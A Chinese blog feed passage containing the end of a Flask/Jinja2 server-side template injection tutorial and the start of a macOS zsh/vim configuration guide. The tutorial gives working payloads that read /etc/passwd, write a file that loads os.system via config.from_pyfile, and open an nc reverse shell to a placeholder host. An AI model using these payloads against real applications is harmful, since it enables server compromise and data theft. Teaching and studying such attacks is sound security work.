<p><img src="http://ony7wielg.bkt.clouddn.com/20170530149609777784600.png" alt="20170530149609777784600.png"></p>
<p>WOW, 连secret_key都爆出来了(还记得hitcon有个题就是这个套路)</p>
<h1 id="0x03-读写文件"><a href="#0x03-读写文件" class="headerlink" title="0x03 读写文件"></a>0x03 读写文件</h1><p>当然, 我们的目标肯定不能止步于一个 <code></code> 泄露出来的信息. 我们想的当然是最好能拿到一个shell.</p>
<p>要拿到shell, 就很难避免要执行命令, 而Jinja和Flask的template是不太可能提供这种功能的(事实上也没有), 所以在这种环境下, 肯定就要想办法调用python的 <code>system()</code> 或者 <code>check_output()</code> 之类可以执行命令的函数.</p>
<p>首先在Flask/Jinja的模板中, python的字符串,数字这类基本对象是肯定是支持的</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170530149610443015120.png" alt="20170530149610443015120.png"></p>
<p>其实根据以前在CTF里面的经验, 不难想到先试着调用一下这些对象的内置方法, 去看一下当前环境下能访问哪些对象 <code>&#39;&#39;.__class__.__mro__[2].__subclasses__()</code> , 或者 <code>(1).__class__.__base__.__subclasses__()</code></p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170530149613100464149.png" alt="20170530149613100464149.png"></p>
<p>这里还是稍微写一下, 首先 <code>&#39;&#39;.__class__</code> 可以访问到字符串的类型对象(关于python中的类型对象参见<a href="http://www.cafepy.com/article/python_types_and_objects/python_types_and_objects.html" target="_blank" rel="external">Python Types and Objects</a>)</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170530149613122259818.png" alt="20170530149613122259818.png"></p>
<p>因为python中所有的对象都是从Object逐级继承来的, 类型对象也不除外, 所有我们就可以调用对象的 <code>__base__</code> 方法访问该对象所继承的对象</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170530149613167899580.png" alt="20170530149613167899580.png"></p>
<p>或者使用 <code>__mro__</code>(Method Resolution Order) 直接获得对象的继承链, python用这个方法来确定对象方法解析的顺序</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170530149613202779829.png" alt="20170530149613202779829.png"></p>
<p>当我们访问到Object的类型对象的时候, 就可以用 <code>__subclasses__()</code>来获得当前环境下能够访问的所有对象.</p>
<p>因为调用对象的 <code>__subclasses__()</code> 方法会返回当前环境中所有继承于该对象的对象. </p>
<p>我们仔细过一遍环境里面存在的对象, 首先引起我们注意的肯定就是这个python内建的file对象</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170530149614817497351.png" alt="20170530149614817497351.png"></p>
<p>至少我们能读写文件了. </p>
<p><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;/etc/passwd&#39;, &#39;r&#39;).read()</code></p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170530149614845235931.png" alt="20170530149614845235931.png"></p>
<p><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;/tmp/test&#39;, &#39;w&#39;).write(&#39;AAAAAAAAAAAAAAAAAA&#39;)</code></p>
<p><img src="http://ony7wielg.bkt.clouddn.com/2017053014961485844412.png" alt="2017053014961485844412.png"></p>
<p>但是即使可以写文件, 好像也拿不到shell, 因为这又不像是PHP, 文件或者说代码的执行我们是很难控制的.</p>
<p>那么就再看看别的对象, 看了一圈好像确实找不到能让我们离命令执行更进一步的对象了, 看来单纯用这种方式很难拿到shell了</p>
<h1 id="0x04-沙盒逃逸"><a href="#0x04-沙盒逃逸" class="headerlink" title="0x04 沙盒逃逸"></a>0x04 沙盒逃逸</h1><p>卡住了以后就按照James大佬的思路, 在我们判断出存在SSTI之后, 下一步要做的就是<strong>仔细阅读文档</strong>, 挖掘一下在当前的环境下有哪些可以利用的点</p>
<blockquote>
<ul>
<li>‘For Template Authors’ sections covering basic syntax.</li>
<li>‘Security Considerations’ - chances are whoever developed the app you’re testing didn’t read this, and it may contain some useful hints.</li>
<li>Lists of builtin methods, functions, filters, and variables.</li>
<li>Lists of extensions/plugins - some may be enabled by default.</li>
</ul>
</blockquote>
<p>在阅读Flask和Jinja的文档的时候, 要仔细翻的就两个部分</p>
<blockquote>
<ul>
<li><a href="http://jinja.pocoo.org/docs/dev/templates/#builtin-globals" target="_blank" rel="external">Jinja globals</a></li>
<li><a href="http://flask.pocoo.org/docs/0.10/templating/#standard-context" target="_blank" rel="external">Flask template globals</a></li>
</ul>
</blockquote>
<p>仔细翻阅之后, 我们在Flask的config对象上找到了突破点, 查看文档发现config对象有一个<a href="http://flask.pocoo.org/docs/0.12/api/#flask.Config.from_pyfile" target="_blank" rel="external">from_pyfile()</a>的方法用于从.py文件中读取配置到config中. 我们去flask的源代码里仔细看一看这个函数的行为</p>
<p>config.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">from_pyfile</span><span class="params">(self, filename, silent=False)</span>:</span></div><div class="line">    <span class="string">"""Updates the values in the config from a Python file.  This function</span></div><div class="line">    behaves as if the file was imported as module with the</div><div class="line">    :meth:`from_object` function.</div><div class="line"></div><div class="line">    :param filename: the filename of the config.  This can either be an</div><div class="line">                     absolute filename or a filename relative to the</div><div class="line">                     root path.</div><div class="line">    :param silent: set to ``True`` if you want silent failure for missing</div><div class="line">                   files.</div><div class="line"></div><div class="line">    .. versionadded:: 0.7</div><div class="line">       `silent` parameter.</div><div class="line">    """</div><div class="line">    filename = os.path.join(self.root_path, filename)</div><div class="line">    d = types.ModuleType(<span class="string">'config'</span>)</div><div class="line">    d.__file__ = filename</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">with</span> open(filename) <span class="keyword">as</span> config_file:</div><div class="line">            exec(compile(config_file.read(), filename, <span class="string">'exec'</span>), d.__dict__)</div><div class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</div><div class="line">        <span class="keyword">if</span> silent <span class="keyword">and</span> e.errno <span class="keyword">in</span> (errno.ENOENT, errno.EISDIR):</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">        e.strerror = <span class="string">'Unable to load configuration file (%s)'</span> % e.strerror</div><div class="line">        <span class="keyword">raise</span></div><div class="line">    self.from_object(d)</div><div class="line">    <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">from_object</span><span class="params">(self, obj)</span>:</span></div><div class="line">    <span class="string">"""Updates the values from the given object.  An object can be of one</span></div><div class="line">    of the following two types:</div><div class="line"></div><div class="line">    -   a string: in this case the object with that name will be imported</div><div class="line">    -   an actual object reference: that object is used directly</div><div class="line"></div><div class="line">    Objects are usually either modules or classes.</div><div class="line"></div><div class="line">    Just the uppercase variables in that object are stored in the config.</div><div class="line">    Example usage::</div><div class="line"></div><div class="line">        app.config.from_object('yourapplication.default_config')</div><div class="line">        from yourapplication import default_config</div><div class="line">        app.config.from_object(default_config)</div><div class="line"></div><div class="line">    You should not use this function to load the actual configuration but</div><div class="line">    rather configuration defaults.  The actual config should be loaded</div><div class="line">    with :meth:`from_pyfile` and ideally from a location not within the</div><div class="line">    package because the package might be installed system wide.</div><div class="line"></div><div class="line">    :param obj: an import name or object</div><div class="line">    """</div><div class="line">    <span class="keyword">if</span> isinstance(obj, string_types):</div><div class="line">        obj = import_string(obj)</div><div class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> dir(obj):</div><div class="line">        <span class="keyword">if</span> key.isupper():</div><div class="line">            self[key] = getattr(obj, key)</div></pre></td></tr></table></figure>
<p>flask有 <code>from_json</code>, <code>from_envvar</code>, <code>from_object</code>, <code>from_mapping</code>, <code>from_pyfile</code> 等好几个更新配置的方法, 但是相比于其它 <code>from_pyfile</code> 这个方法的实现有点特殊. 我们看上面的源码, 首先新建一个module对象d, 然后把传入的文件读出来用compile()编译成exec()可以执行的code对象,  然后执行, <strong>并且把 <code>d.__dict__</code> 用作代码对象code执行的scope</strong>. 这句话可能比较抽象, 或者我说的不准确, 这里放一张调试的图, 相信大家一看就明白了</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/2017053114961670666146.png" alt="2017053114961670666146.png"></p>
<p>然后又将d传入了 <code>from_object</code> 方法, <code>from_object</code> 方法遍历 <code>d.__dict__</code> 将键名为大写的键值对更新到当前环境的config对象中.</p>
<p>所以如果我们能让 <code>from_pyfile</code> 去读这样的一个文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</div><div class="line">SHELL = system</div></pre></td></tr></table></figure>
<p>那么我们访问 <code>config[&#39;SHELL&#39;]</code> 时, 实际上就能访问到 <code>system</code> 函数了. 而我们前面又已经做到了文件读写, 所以两个点结合起来我们就完全可以拿到SHELL</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170531149616851775623.png" alt="20170531149616851775623.png"></p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170531149616854020117.png" alt="20170531149616854020117.png"></p>
<p>我们最终的payload为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&#123;&#123; <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/tmp/evil'</span>, <span class="string">'w'</span>).write(<span class="string">'from os import system%0aSHELL = system'</span>) &#125;&#125;</div><div class="line">//写文件</div><div class="line">&#123;&#123; config.from_pyfile(<span class="string">'/tmp/evil'</span>) &#125;&#125;</div><div class="line">//加载system</div><div class="line">&#123;&#123; config[<span class="string">'SHELL'</span>](<span class="string">'nc xxxx xx -e /bin/sh'</span>) &#125;&#125;</div><div class="line">//执行命令反弹SHELL</div></pre></td></tr></table></figure>
<h1 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h1><p><a href="http://www.cafepy.com/article/python_types_and_objects/python_types_and_objects.html" target="_blank" rel="external">http://www.cafepy.com/article/python_types_and_objects/python_types_and_objects.html</a></p>
<p><a href="http://flask.pocoo.org/docs/0.12/api/#flask.Config.from_pyfile" target="_blank" rel="external">http://flask.pocoo.org/docs/0.12/api/#flask.Config.from_pyfile</a></p>
<p><a href="https://docs.python.org/3/library/types.html" target="_blank" rel="external">https://docs.python.org/3/library/types.html</a></p>
<p><a href="https://docs.python.org/3/library/functions.html#exec" target="_blank" rel="external">https://docs.python.org/3/library/functions.html#exec</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h1&gt;&lt;p&gt;最近看了国外几篇关于模板注入的文章, 自己也在这里加上自己的一些东西总结一下.  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>macOS下 Oh-my-zsh+tmux+vim 打造完美命令行环境</title>
    <link href="http://klaus.link/2017/Oh-my-zsh+tmux+vim_effective_CommandLine/"/>
    <id>http://klaus.link/2017/Oh-my-zsh+tmux+vim_effective_CommandLine/</id>
    <published>2017-02-16T08:25:33.000Z</published>
    <updated>2017-06-02T20:58:56.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p>新学期买了个新显示器专门用来放命令行,忙活了半天,集中解决了许多由来已久的小问题. 顺便总结一下</p>
<h2 id="0x01-配置zsh"><a href="#0x01-配置zsh" class="headerlink" title="0x01 配置zsh"></a>0x01 配置zsh</h2><p>命令行这种交互方式虽然原始单调,但配置好了,还真不一定比GUI丑.</p>
<p>大部分*nuix系统上默认的命令行工具都是bash,但是类似于bash的这种命令行工具不止一个. 你在命令行输入zsh就会发现进入到了另外一个shell里面,最主要是有Oh-my-zsh这个好东东啊,自带了上百个插件和主题,不光好看,拓展起来更是极为方便</p>
<p>首先把默认shell更改为zsh</p>
<p><code>chsh -s /bin/zsh</code></p>
<p>然后下载oh-my-zsh插件(自动安装)</p>
<p><code>wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh</code></p>
<p>装好以后我们来看一下oh-my-zsh的配置文件 在用户的home目录下会有一个.zshrc</p>
<p>打开以后找到<code>ZSH_THEME</code>这个配置</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170603149643635455585.jpg" alt="20170603149643635455585.jpg"></p>
<p>通过更改这个配置就可以为shell换上不同的主题啦,oh-my-zsh自带很多主题,可以在<a href="https://github.com/robbyrussell/oh-my-zsh/wiki/Themes" target="_blank" rel="external">https://github.com/robbyrussell/oh-my-zsh/wiki/Themes</a> 找到所有的,只需要换成相应的名字就可以了无需安装</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170603149643648291905.jpg" alt="20170603149643648291905.jpg"></p>
<p>然后我们向下挪一点找到<code>plugins=()</code>这个设置,oh-my-zsh自带了很多插件,我们只需要填到这个括号里就可以启用,这里只介绍几个常用的</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170603149643662122216.jpg" alt="20170603149643662122216.jpg"><br>“z”真是太好用的一个插件,他不需要你记住很多目录名,支持模糊匹配,并且带学习功能,越用越好用</p>
<p>举个栗子,比如我想要去家目录下面的Documents,我只需<code>z doc</code>就可以了,再比如我只要去过一次/etc/php5/apache2这个目录,下次无论你在什么目录下,只要一个<code>z apac</code>就直接跳去了</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170603149643664840258.jpg" alt="20170603149643664840258.jpg"></p>
<p>还有”d”插件,这个插件可以查看历史命令然后通过前面的标号快速执行以前的命令,命令比较多的时候,的确是比来回用<code>Ctrl-p</code> <code>Ctrl-n</code> 上下翻方便多了</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170603149643666982275.jpg" alt="20170603149643666982275.jpg"></p>
<p>然后我们再来装一个特别好用的自动补全插件 zsh-autosuggestion </p>
<p>执行<code>git clone git://github.com/zsh-users/zsh-autosuggestions ~/.zsh/zsh-autosuggestions</code></p>
<p>然后把<code>source ~/.zsh/zsh-autosuggestions/zsh-autosuggestions.zsh</code>加到.zshrc里</p>
<p>然后退出zsh重新进入你就会看到跟fish一样的补全效果了</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170603149643669035640.jpg" alt="20170603149643669035640.jpg"></p>
<p>然后<code>Ctrl-e</code>或者右箭头就补全了</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170603149643671094537.jpg" alt="20170603149643671094537.jpg"></p>
<h2 id="0x02-配置VIM"><a href="#0x02-配置VIM" class="headerlink" title="0x02 配置VIM"></a>0x02 配置VIM</h2><p>既然用命令行,配置一个属于自己的VIM也就是必须的啦,系统自带,小到几十一百行的shell小脚本,大到上百个文件的C++工程,都可用以vim解决. 自古代码编辑器唯快不破,”快”Vim自身就已经解决了,就让我们来看看怎么把vim配置得更加友好易用一些.</p>
<p>首先在家目录下面打开.vimrc文件,如果没有就自己新建一个</p>
<p>加上下面这一行就可以在左侧显示行号啦</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> nu <span class="string">"显示行号</span></div></pre></td></tr></table></figure>
<p>代码高亮/缩进</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">syntax <span class="built_in">enable</span> <span class="string">"开启代码高亮</span></div><div class="line">set showmatch "高亮匹配的括号<span class="string">"</span></div><div class="line">set background = dark "设置暗背景<span class="string">"</span></div><div class="line">set ts = 4 "设置tab为4个空格的宽度<span class="string">"</span></div><div class="line">set expandtab "将tab转化为空格<span class="string">"</span></div><div class="line">set backspace = 2 "开启增强模式,解决macOS下delete失效的问题<span class="string">"</span></div><div class="line">set autoindent "自动缩进<span class="string">"</span></div><div class="line">set textwidth = 79 "单行过长提示<span class="string">"</span></div><div class="line">highlight BadWhitespace ctermbg=red guibg=darkred "高亮错误的空格</div><div class="line">au BufRead,BufNewFile *.py,*.pyw,*.c,*.h match BadWhitespace /\s\+$/ <span class="string">"高亮多余的空格</span></div></pre></td></tr></table></figure>
<p>代码折叠</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nnoremap &lt;space&gt; za <span class="string">"把空格映射成za(折叠代码)"</span></div><div class="line"><span class="built_in">set</span> foldmethod=indent <span class="string">"判断代码折叠的方式为缩进"</span></div></pre></td></tr></table></figure>
<p>这样在函数,或者类上按一下空格这一段代码就会折叠成一行了.</p>
<p>设置状态栏</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> laststatus = 2 </div><div class="line"><span class="built_in">set</span> statusline=</div><div class="line"><span class="built_in">set</span> statusline=</div><div class="line"><span class="built_in">set</span> statusline +=*\ %&lt;%F%*            <span class="string">"显示文件路径</span></div><div class="line">set statusline +=*%m%*                "文件改动标志</div><div class="line"><span class="built_in">set</span> statusline +=*%=%5l%*             <span class="string">"当前行数</span></div><div class="line">set statusline +=*/%LL\ %*            "总行数</div><div class="line"><span class="built_in">set</span> statusline +=*%vC\ %*             <span class="string">"当前列数</span></div><div class="line">set statusline +=*0x%04B\ %*          "显示光标下字符的十六进制编码</div><div class="line"></div><div class="line"><span class="built_in">set</span> showcmd								<span class="string">"显示输入的vim命令</span></div></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/006tT0yqly1fcus2cutpsj30k901l402" alt=""></p>
<p>这里面的F,m,l,L,C之类的就是代表后面的注释,除了这些vim还支持很多,全部标识符和表达式的格式可以在<a href="http://vimdoc.sourceforge.net/htmldoc/options.html#&#39;statusline&#39;" target="_blank" rel="external">http://vimdoc.sourceforge.net/htmldoc/options.html#’statusline’</a>找到</p>
<p>当然你也可以给它配上颜色</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> statusline=</div><div class="line"><span class="built_in">set</span> statusline +=%1*\ %&lt;%F%*          </div><div class="line"><span class="built_in">set</span> statusline +=%2*%m%*              </div><div class="line"><span class="built_in">set</span> statusline +=*%=%5l%*             </div><div class="line"><span class="built_in">set</span> statusline +=%3*/%LL\ %*            </div><div class="line"><span class="built_in">set</span> statusline +=%3*%vC\ %*              </div><div class="line"><span class="built_in">set</span> statusline +=%2*0x%04B\ %*          </div><div class="line">hi User1 ctermfg=red ctermbg=green</div><div class="line">hi User2 ctermfg=white ctermbg=red</div><div class="line">hi User3 ctermfg=white ctermbg=blue</div><div class="line">hi User4 ctermfg=white ctermbg=green</div></pre></td></tr></table></figure>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170603149643673173307.jpg" alt="20170603149643673173307.jpg"></p>
<p>前面的%加数字就是编号,用后面的hi来设置颜色(想要什么颜色自己改掉就好)</p>
<p>然后我们改一下光标的显示方式</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">highlight CursorColumn ctermbg=black ctermfg=green  <span class="string">"设置当前列颜色</span></div><div class="line">highlight clear LineNr								"取消行号的高亮</div><div class="line"><span class="built_in">set</span> cursorline										<span class="string">"设置当前行下划线</span></div><div class="line"></div><div class="line">set hlsearch										"设置搜索结果高亮</div></pre></td></tr></table></figure>
<p>这样就有下面的效果了</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170603149643675116253.jpg" alt="20170603149643675116253.jpg"></p>
<p>然后我们需要解决的一个重要的问题就是复制粘贴,在GUI下面复制粘贴可能是经常干的事情,但是在vim里面我们是不能<code>Ctrl-c</code>的,那我们怎么把vim里面的东西复制出来呢,把下面这条配置写在加在.vimrc里面,把vim的剪贴板与系统的剪切板打通</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> clipboard+=unnamed</div></pre></td></tr></table></figure>
<p>重新进入vim你就会发现你只需要在v模式下选中内容后按y,再到别的地方<code>Ctrl-v</code>就可以啦</p>
<p>另外一个问题就是,当我们在外部向vim里面粘贴东西时,整个缩进就乱了,这是因为我们向vim里面粘贴东西时,效果就等同于把复制的内容用键盘一个一个敲进来.为了能把原文照样复制进来,我们加上下面几行设置</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> pastetoggle =&lt;F1&gt;</div><div class="line">nnoremap &lt;F1&gt; :<span class="built_in">set</span> invpaste paste?&lt;CR&gt;i</div><div class="line">imap &lt;F1&gt; &lt;C-O&gt;:<span class="built_in">set</span> invpaste paste?&lt;CR&gt;</div></pre></td></tr></table></figure>
<p>这样当我们在普通模式或者插入模式下按下F1的时候就可以切换到paste模式里了,这时候再粘贴格式就不会乱了</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170603149643692892529.jpg" alt="20170603149643692892529.jpg"></p>
<p>解决vim烦人的闪屏和告警</p>
<p>用vim会发现当我们退到不能退的地方继续退格时就会有闪屏和铃声告警,我们加上下面这行设置把它取消掉</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> vb t_vb=</div></pre></td></tr></table></figure>
<p>设置vim使用UTF-8编码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> encoding=utf-8</div></pre></td></tr></table></figure>
<p>关闭vi兼容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> nocompatible  <span class="string">"关闭vi兼容,以免之后出现各种错误</span></div></pre></td></tr></table></figure>
<p>Vim插件管理</p>
<p>vim除了自身非常强大以外,插件也是必不可少的. 其实也正是Vim支持的众多插件才使vim把一切变成了可能.</p>
<p>下面就先介绍一下vim的插件管理利器Vundle(当然啦,它也是一个插件)</p>
<p>项目地址在这里:<a href="https://github.com/VundleVim/Vundle.vim" target="_blank" rel="external">https://github.com/VundleVim/Vundle.vim</a></p>
<p>执行下面的命令安装:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim</div></pre></td></tr></table></figure>
<p>然后把下面的几行粘到.vimrc里面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&quot;Vundle</div><div class="line">&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;</div><div class="line">set nocompatible              &quot; be iMproved, required</div><div class="line">filetype off                  &quot; required</div><div class="line">set rtp+=~/.vim/bundle/Vundle.vim</div><div class="line">call vundle#begin()</div><div class="line"></div><div class="line">Plugin &apos;VundleVim/Vundle.vim&apos;</div><div class="line"></div><div class="line">call vundle#end()            &quot; required</div><div class="line">filetype plugin indent on    &quot; required</div><div class="line">&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;</div></pre></td></tr></table></figure>
<p>好啦,有了Vundle以后再装别的插件就方便多了,下面让我们来装一个试试</p>
<p>Vim目录树插件: NERDTree</p>
<p>项目地址:<a href="https://github.com/scrooloose/nerdtree" target="_blank" rel="external">https://github.com/scrooloose/nerdtree</a></p>
<p>装上这个以后vim也可以像GUI一样在旁边的侧栏里选择打开文件了</p>
<p>先上一张效果图</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170603149643695085527.jpg" alt="20170603149643695085527.jpg"></p>
<p>很方便吧</p>
<p>安装它只需要再上面的配置文件中加上一行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Plugin <span class="string">'scrooloose/nerdtree'</span></div></pre></td></tr></table></figure>
<p>注意是加在begin()和end()中间</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="string">"Vundle</span></div><div class="line">"<span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">"</span></div><div class="line">set nocompatible              " be iMproved, required</div><div class="line">filetype off                  <span class="string">" required</span></div><div class="line">set rtp+=~/.vim/bundle/Vundle.vim</div><div class="line">call vundle#begin()</div><div class="line"></div><div class="line">Plugin 'VundleVim/Vundle.vim'</div><div class="line">Plugin 'scrooloose/nerdtree'</div><div class="line"></div><div class="line">call vundle#end()            " required</div><div class="line">filetype plugin indent on    <span class="string">" required</span></div><div class="line">"<span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span></div></pre></td></tr></table></figure>
<p>我们在命令行下打开vim,执行:PluginInstall,Vundle就会帮你自动下载安装了</p>
<p>没错,每一行Plugin对应的就是一个vim插件如果你想禁用掉某个插件直接把那一行注释掉就好了,是不是很方便呢</p>
<p>默认情况下,你执行:NERDTree会打开目录树,如果你想一打开文件就自动打开NERDTree的话可以在.vimrc里加上</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">autocmd vimenter * NERDTree</div></pre></td></tr></table></figure>
<p>或者你可以把开关NERDTree用某个键映射下来:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">map &lt;C-n&gt; :NERDTreeToggle&lt;CR&gt;</div></pre></td></tr></table></figure>
<p>更多设置参见:<a href="https://github.com/VundleVim/Vundle.vim" target="_blank" rel="external">https://github.com/VundleVim/Vundle.vim</a></p>
<p>Vim 语法检查</p>
<p>Vim虽然只是一个代码编辑器,但是装上插件以后照样有IDE一样的代码检查功能</p>
<p>还是上面的方法,用Vundle安装:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Plugin <span class="string">'scrooloose/syntastic'</span></div></pre></td></tr></table></figure>
<p>注意,你运行完:PluginInstall后,syntastic并不是完全可用的,它对某些语言的检查是依赖外部程序的,以python为例,syntastic需要pep8,pylint等等这样的外部程序.所以我们先要安装一个pylint</p>
